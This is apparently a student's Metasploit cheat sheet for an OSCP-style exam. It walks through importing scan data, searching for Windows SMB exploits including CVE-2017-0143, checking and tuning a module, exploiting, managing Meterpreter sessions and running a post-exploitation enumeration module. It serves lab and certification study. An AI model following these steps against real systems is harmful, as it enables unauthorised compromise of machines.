
# *"You may only use Metasploit modules (**Auxiliary**, **Exploit**, and **Post**) or the Meterpreter payload against one single target machine of your choice."*


# 0) Boot & prep
```
msfconsole -q
```

```
db_status
```

```
spool /home/kali/OSCP/CTFs/ctf_NOTES_obs/Msf_exam.log
```

Set global RHOSTS 
```
set RHOSTS 192.168.102.227
```


# 1) Bring in facts (safe)
# (Use Nmap outside MSF or db_import XML you already have)
```
db_import /path/to/this_target.xml 
```
see 
```
hosts
services
```

OR see many with 
```
hosts -c address,os_name,os_flavor,arch,info,os_flavor,comments
```

See services : (`example`)
```
services -p 445,80,443 -s open -c host,port,proto,name,info
```


Search the datebase for vulns on 
```
vulns -p 445
```

# 4) Searching for modules
```
search type:exploit platform:windows app:smb arch:x64
```


Get help menu with search
```
search --help
```


```
# XP/5.1-only vibes, great rank, in SMB
search type:exploit platform:windows path:windows/smb rank:great name:xp name:5.1

# General SMB exploits on Windows, great-or-better rank
search type:exploit platform:windows path:windows/smb rank:great,excellent

# SMB exploits for x64 targets only
search type:exploit platform:windows arch:x64 path:windows/smb

# Filter by CVE inside that path
search path:windows/smb cve:2017-0143



search type:exploit platform:windows -r great name:smb
search type:auxiliary name:ssh
```


# 5) Inspect a candidate exploit

```
use exploit/windows/smb/<candidate>

show targets          # module’s supported OS/builds (doesn’t probe host)
show options
info
```


```
set VERBOSE true
```
# 6) Safety check BEFORE firing (allowed only on THIS box)
- Use module’s safe probe **if available**
```
check
```

# 7) Tune to be less aggressive
```
set TARGET <index>     # don’t rely on 'Automatic'

set VERBOSE false
set ConnectTimeout 10
set WfsDelay 0
```

# HTTP modules often support: set HttpClientTimeout 10, set VHOST `<name>`
exit
# Scanners: set THREADS 1

# 8) Exploit (foothold)
exploit                # or: run

# 9) Session handling
```
# Meterpreter:
#   meterpreter > sysinfo
#   meterpreter > background   (or Ctrl+Z)
# Plain shell:
#   ^Z then 'y' to background

```


```
sessions               # list
sessions -i 1          # reattach
```
# If you used Meterpreter here, remember: it's locked to THIS target per rules.

# 10) Post on THIS target only
```
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
back
```
# 11) Persist your console state & logs
```
save
spool off
```

----

Config is in 

```
/home/kali/.msf4/config
```


Clear hosts from the console 

```
hosts -d 10.129.95.233
```